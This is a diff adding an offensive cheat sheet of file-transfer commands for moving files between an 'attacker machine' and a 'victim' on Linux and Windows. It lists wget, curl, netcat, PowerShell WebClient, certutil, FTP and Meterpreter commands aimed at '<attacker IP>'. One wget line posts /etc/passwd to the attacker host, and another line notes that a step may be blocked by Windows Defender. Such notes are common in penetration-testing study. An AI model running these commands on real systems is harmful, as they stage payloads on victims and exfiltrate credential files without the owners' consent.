@@ -1,0 +1,58 @@
+Linux
+
+	Find a writeable directory 
+		find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
+
+	HTTP
+		on attacker machine
+			python -m SimpleHTTPServer 80
+			
+			python3 -m http.server 80
+		
+			socat -vv TCP-LISTEN:80,crlf,reuseaddr,fork SYSTEM:"echo HTTP/1.0 200; echo Content-Type\: text/html; echo; cat index.html"
+
+		on victim
+			wget http://<attacker IP>/file.ext
+		
+			curl http://<attacker IP>/file.ext > file
+
+	FTP
+		on attacker machine
+			python -m pyftpdlib -p 21 -w
+			python3 -m pyftpdlib -p 21 -w
+
+	netcat
+		on victim machine
+			nc -nvlp <listen_port>
+		on attacker machine
+			nc <victim IP> <listen port> < file
+
+		wget --post-file=/etc/passwd <attacker IP>:<listen_port>
+		
+
+
+Windows
+
+
+	Powershell
+		PowerShell -c "(new-object System.Net.WebClient).DownloadFile('<source URL>', '<destination file path>')"
+
+	xcopy between machines on a domain
+		xcopy \\<remote_PC>\c$\temp\<filename> c:\temp\<directory_name>
+
+	HTTP
+		certutil -urlcache -f http://<attacker IP>/<target file> <save as>
+		c:\path\to\destination
+		May be blocked by Windows Defender
+
+	FTP
+		ftp <attacker IP>
+
+	TinyWeb server
+		https://www.ritlabs.com/download/tinyweb/tinyweb-1-94.zip
+
+	Metasploit - in meterpreter shell 
+		upload <source path>
+		download <source path> <download as>
+		NOTE: need to escape \ in meterpreter (e.g. c:\\user)
+
